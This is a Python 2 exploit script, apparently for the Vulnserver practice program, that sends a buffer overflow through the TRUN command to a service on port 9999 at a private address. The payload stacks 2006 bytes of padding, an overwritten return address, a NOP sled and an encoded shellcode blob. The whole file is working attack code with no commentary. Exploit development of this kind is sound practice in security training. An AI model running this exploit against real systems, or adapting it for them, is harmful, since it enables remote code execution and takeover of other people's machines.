#!/usr/bin/python2
import socket
server = '192.168.200.223'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
buf =  b""
buf += b"\xd9\xc9\xb8\x11\x83\x0d\xca\xd9\x74\x24\xf4\x5f"
buf += b"\x31\xc9\xb1\x52\x31\x47\x17\x03\x47\x17\x83\xd6"
buf += b"\x87\xef\x3f\x24\x6f\x6d\xbf\xd4\x70\x12\x49\x31"
buf += b"\x41\x12\x2d\x32\xf2\xa2\x25\x16\xff\x49\x6b\x82"
buf += b"\x74\x3f\xa4\xa5\x3d\x8a\x92\x88\xbe\xa7\xe7\x8b"
buf += b"\x3c\xba\x3b\x6b\x7c\x75\x4e\x6a\xb9\x68\xa3\x3e"
buf += b"\x12\xe6\x16\xae\x17\xb2\xaa\x45\x6b\x52\xab\xba"
buf += b"\x3c\x55\x9a\x6d\x36\x0c\x3c\x8c\x9b\x24\x75\x96"
buf += b"\xf8\x01\xcf\x2d\xca\xfe\xce\xe7\x02\xfe\x7d\xc6"
buf += b"\xaa\x0d\x7f\x0f\x0c\xee\x0a\x79\x6e\x93\x0c\xbe"
buf += b"\x0c\x4f\x98\x24\xb6\x04\x3a\x80\x46\xc8\xdd\x43"
buf += b"\x44\xa5\xaa\x0b\x49\x38\x7e\x20\x75\xb1\x81\xe6"
buf += b"\xff\x81\xa5\x22\x5b\x51\xc7\x73\x01\x34\xf8\x63"
buf += b"\xea\xe9\x5c\xe8\x07\xfd\xec\xb3\x4f\x32\xdd\x4b"
buf += b"\x90\x5c\x56\x38\xa2\xc3\xcc\xd6\x8e\x8c\xca\x21"
buf += b"\xf0\xa6\xab\xbd\x0f\x49\xcc\x94\xcb\x1d\x9c\x8e"
buf += b"\xfa\x1d\x77\x4e\x02\xc8\xd8\x1e\xac\xa3\x98\xce"
buf += b"\x0c\x14\x71\x04\x83\x4b\x61\x27\x49\xe4\x08\xd2"
buf += b"\x1a\xcb\x65\x14\x3e\xa3\x77\xa4\xbe\x8f\xf1\x42"
buf += b"\xaa\xff\x57\xdd\x43\x99\xfd\x95\xf2\x66\x28\xd0"
buf += b"\x35\xec\xdf\x25\xfb\x05\x95\x35\x6c\xe6\xe0\x67"
buf += b"\x3b\xf9\xde\x0f\xa7\x68\x85\xcf\xae\x90\x12\x98"
buf += b"\xe7\x67\x6b\x4c\x1a\xd1\xc5\x72\xe7\x87\x2e\x36"
buf += b"\x3c\x74\xb0\xb7\xb1\xc0\x96\xa7\x0f\xc8\x92\x93"
buf += b"\xdf\x9f\x4c\x4d\xa6\x49\x3f\x27\x70\x25\xe9\xaf"
buf += b"\x05\x05\x2a\xa9\x09\x40\xdc\x55\xbb\x3d\x99\x6a"
buf += b"\x74\xaa\x2d\x13\x68\x4a\xd1\xce\x28\x6a\x30\xda"
buf += b"\x44\x03\xed\x8f\xe4\x4e\x0e\x7a\x2a\x77\x8d\x8e"
buf += b"\xd3\x8c\x8d\xfb\xd6\xc9\x09\x10\xab\x42\xfc\x16"
buf += b"\x18\x62\xd5"
padding = 'F' * (3000 - 2006 - 4 - 16 - len(buf))
attack = prefix + eip + nopsled + buf + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
